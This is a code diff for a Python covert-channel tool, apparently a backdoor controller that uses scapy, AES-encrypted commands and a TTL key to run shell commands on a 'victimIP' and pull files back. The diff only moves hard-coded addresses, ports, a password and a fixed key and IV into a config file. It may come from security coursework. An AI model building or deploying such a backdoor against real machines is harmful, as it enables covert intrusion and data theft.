@@ -1,24 +1,24 @@
-
 #Dependancies
 from multiprocessing import Process
 from scapy.all import *
 from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
 import uuid #Used to generate UID's
 import os # Used for executing commands on shell.
+import parseConfig
 
-#Inputs
-victimIP = "192.168.0.7"
-ttlKey = 164
-srcPort = 80
-dstPort = 8000
-encryptionKey = "0123456789abcdef"
-IV = "abcdefghijklmnop"
-protocol = "TCP"
-password = "TEST!"
-authentication = "TEST!"
-localIP = "192.168.0.6"
+#Inputs from config file
+victimIP = parseConfig.victimIP
+ttlKey = parseConfig.ttlKey
+srcPort = parseConfig.srcPort
+dstPort = parseConfig.dstPort
+key = parseConfig.key
+IV = parseConfig.IV
+protocol = parseConfig.protocol
+password = parseConfig.password
+authentication = parseConfig.authentication
+localIP = parseConfig.localIP
+saveDir = parseConfig.saveDir
 messages = []
-
 
 #Encrypt the message
 def encrypt(message):
@@ -426,7 +426,7 @@ def writeFile(UID):
 
             secretMessage = bytearray(byteArray)
         	#re-create the file
-            createFile = open("copy/" + fileName, 'wb')
+            createFile = open(saveDir + fileName, 'wb')
             createFile.write(secretMessage)
 
 def sniffCommand():
